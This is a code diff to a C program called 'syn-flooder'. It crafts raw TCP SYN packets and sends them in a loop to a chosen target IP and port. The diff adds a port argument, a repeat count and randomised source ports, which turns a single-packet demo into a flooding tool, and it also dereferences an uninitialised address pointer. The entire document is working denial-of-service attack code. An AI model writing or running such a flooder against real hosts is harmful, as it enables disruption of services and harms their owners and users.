@@ -8,19 +8,6 @@
 
 #include <errno.h> // error handling
 
-struct ip_hdr {
-  unsigned char ip_version_and_header_length;
-  unsigned char ip_top;
-  unsigned short ip_len;
-  unsigned short ip_id;
-  unsigned short ip_frag_offset;
-  unsigned short ip_ttl;
-  unsigned short ip_type;
-  unsigned short ip_checksum;
-  unsigned int ip_src_addr;
-  unsigned int ip_dest_addr;
-};
-
 struct tcp_hdr {
   unsigned short tcp_src_port;
   unsigned short tcp_dest_port;
@@ -42,20 +29,19 @@ struct tcp_hdr {
 
 void decode_ip(const u_char *);
 u_int decode_tcp(const u_char *);
-void build_tcp_syn(char *buffer);
+void build_tcp_syn(char *buffer, int port);
 short compute_tcp_checksum(char *buffer);
+void send_tcp_syn(int socket, struct sockaddr_in *target_address, int target_port);
 
 int main(int argc, char *argv[]) {
   int raw_socket; // raw IP socket
-  int i, yes = 1;
-  char packet[100];
+  int i, target_port, yes = 1;
   struct sockaddr_in *address;
-  socklen_t addrlen;
-  unsigned char *ip_addr_part;
+  int times = 1;
   
-  if (argc != 2) {
+  if (argc < 3) {
     printf("Usage:\n");
-    printf("./syn-flooder <target-ip>\n");
+    printf("./syn-flooder <target-ip> <target-port> [number-times]\n");
     exit(1);
   }
 
@@ -64,27 +50,39 @@ int main(int argc, char *argv[]) {
     exit(1);
   }
 
-  addrlen = sizeof(struct sockaddr_in);
-  
+  if (argc == 4) times = atoi(argv[3]);
+
   if ((raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
     printf("Error creating socket: %s\n", strerror(errno));
     exit(1);
   }
 
-  build_tcp_syn(packet);
-  // decode_tcp(packet);
-  
+  target_port = atoi(argv[2]);
+    
   address->sin_family = AF_INET;
   address->sin_port = 0;
   inet_aton(argv[1], &(address->sin_addr));
 
-  if ((sendto(raw_socket, packet, sizeof(struct tcp_hdr), 0, (struct sockaddr *)address, addrlen)) == -1) {
+  for (i = 0; i < times; i++) {
+    send_tcp_syn(raw_socket, address, target_port);    
+  }
+}
+
+void send_tcp_syn(int socket, struct sockaddr_in *target_address, int target_port) {
+  char packet[100];
+  unsigned char *ip_addr_part;
+  int i;
+  
+  build_tcp_syn(packet, target_port);
+  // decode_tcp(packet);
+  
+  if ((sendto(socket, packet, sizeof(struct tcp_hdr), 0, (struct sockaddr *)target_address, sizeof(struct sockaddr_in))) == -1) {
     printf("Error sending data: %s\n", strerror(errno));
     exit(1);
   }
 
   printf("Sending TCP SYN to IP ");
-  ip_addr_part = (unsigned char *)(&(address->sin_addr).s_addr);
+  ip_addr_part = (unsigned char *)(&(target_address->sin_addr).s_addr);
   for(i = 0; i < 4; i++) {
     if (i > 0) {
       printf(".");
@@ -93,14 +91,17 @@ int main(int argc, char *argv[]) {
     ip_addr_part++;
   }
   printf("\n");
-
+  
 }
 
-void build_tcp_syn(char *buffer) {
+void build_tcp_syn(char *buffer, int port) {
   struct tcp_hdr *header = (struct tcp_hdr *) buffer;
 
-  header->tcp_src_port = htons(7890);
-  header->tcp_dest_port = htons(7890);
+  // note that random() returns a sequence of pseudo-random numbers
+  // if not seeded before with srandom(seed), that sequence will repeat
+  // for every execution.
+  header->tcp_src_port = htons(random());
+  header->tcp_dest_port = htons(port);
   header->tcp_seq = htonl(1);
   header->tcp_ack = 0;
   header->reserved = 0;
@@ -128,17 +129,6 @@ short compute_tcp_checksum(char *buffer) {
   }
 
   return checksum;
-}
-
-void decode_ip(const u_char *header_start) {
-  const struct ip_hdr *ip_header;
-
-  ip_header = (const struct ip_hdr *)header_start;
-  printf("\t(( Layer 3 ::: IP Header ))\n");
-  printf("\t( Source: %s\t", inet_ntoa(ip_header->ip_src_addr));
-  printf("Dest: %s)\n", inet_ntoa(ip_header->ip_dest_addr));
-  printf("\t( Type: %u\t", (u_int) ip_header->ip_type);
-  printf("ID: %hu\tLength: %u\n", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));
 }
 
 u_int decode_tcp(const u_char *header_start) {
